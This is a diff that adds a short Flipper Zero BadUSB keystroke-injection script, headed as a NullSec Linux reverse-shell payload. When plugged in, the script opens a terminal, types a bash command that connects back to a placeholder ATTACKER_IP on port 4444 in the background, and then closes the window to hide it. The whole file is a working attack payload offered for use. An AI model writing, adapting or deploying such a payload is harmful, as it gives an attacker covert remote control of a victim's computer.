@@ -1,0 +1,13 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Linux Reverse Shell
+REM Target: Linux
+REM ========================================
+REM CONFIGURE: Change ATTACKER_IP and PORT
+DELAY 1000
+CTRL ALT t
+DELAY 1000
+STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
+ENTER
+STRING exit
+ENTER
